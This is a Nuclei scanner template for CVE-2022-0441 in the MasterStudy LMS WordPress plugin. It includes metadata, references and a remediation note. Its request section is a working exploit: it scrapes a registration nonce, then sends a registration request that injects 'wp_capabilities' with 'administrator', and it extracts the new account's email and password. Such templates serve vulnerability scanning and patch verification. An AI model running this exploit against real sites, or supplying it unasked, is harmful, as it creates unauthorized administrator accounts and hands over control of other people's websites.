id: CVE-2022-0441

info:
  name: WordPress MasterStudy LMS Plugin Privilege Escalation
  author: dwisiswant0
  severity: critical
  description: |
    The MasterStudy LMS WordPress plugin before 2.7.6 does to
    validate some parameters given when registering a new account,
    allowing unauthenticated users to register as an admin.
  reference:
    - https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed
    - https://plugins.trac.wordpress.org/changeset/2667195
  remediation: Upgrade to version >= 2.7.6.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0441
    cwe-id: CWE-269
  tags: cve,cve2022,wordpress,wp-plugin,masterstudy

variables:
  username: "{{to_lower(rand_text_alphanumeric(6))}}"
  password: "{{rand_text_alphanumeric(12)}}"
  user_email: "{{username}}@{{to_lower(rand_text_alphanumeric(6))}}.com"

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce={{nonce}} HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/json

        {
          "user_login": "{{username}}",
          "user_email": "{{user_email}}",
          "user_password": "{{password}}",
          "user_password_re": "{{password}}",
          "become_instructor": "",
          "privacy_policy": true,
          "degree": "",
          "expertize": "",
          "auditory": "",
          "additional": [],
          "additional_instructors": [],
          "profile_default_fields_for_register": {
            "wp_capabilities": {
              "value": {
                "administrator": 1
              }
            }
          }
        }

    extractors:
      - type: regex
        name: nonce
        group: 1
        regex:
          - '"stm_lms_register":"([0-9a-z]+)"'
        internal: true

      - type: kval
        kval:
          - user_email
          - password

    req-condition: true
    matchers:
      - type: word
        part: body_2
        words:
          - 'Registration completed successfully'
          - '"status":"success"'
        condition: and